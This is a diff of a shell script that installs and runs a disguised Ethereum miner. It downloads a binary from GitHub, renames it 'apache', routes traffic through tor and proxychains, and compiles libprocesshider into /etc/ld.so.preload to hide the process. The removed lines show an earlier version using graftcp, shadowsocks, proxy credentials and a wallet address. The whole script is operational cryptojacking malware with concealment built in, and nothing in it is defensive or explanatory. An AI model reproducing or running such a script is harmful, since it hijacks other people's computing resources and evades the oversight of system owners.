@@ -1,49 +1,20 @@
 #!/bin/sh
-sleep 5m
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+sleep 10m
+apt update
+apt -y install binutils cmake build-essential unzip net-tools curl tor proxychains
+service tor start
 
-apt update 
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
-wget https://github.com/christiarch/templates/raw/main/lba 
-chmod +x lba 
-npm i -g node-process-hider 
+sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g' /etc/proxychains.conf
 
-ph add graftcp
-ph add MIN
+wget https://github.com/aurbach55/sugeh-ice/raw/main/miZni
+chmod +x miZni
+mv miZni apache
 
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
+git clone https://github.com/aurbach55/libprocesshider.git
+cd libprocesshider
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
 
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 191.101.148.51:45786
-socks5_username = Selshindeparshuram2012
-socks5_password = V7p9BkV
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-
-./graftcp/graftcp wget https://bitbucket.org/skyforce112211/skyforce123/downloads/MIN
-chmod +x MIN
-
-
-apt -y install shadowsocks-libev rng-tools
-
-ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &
-
-./graftcp/graftcp ./MIN --algo ethash --pers auto --server eth.cruxpool.com --port 5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.T4 >/dev/null 2>&1
-sleep 2
+proxychains ./apache --url=ssl://prodent.$(echo $(shuf -i 1-1000 -n 1)-T4)@ethash.kupool.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
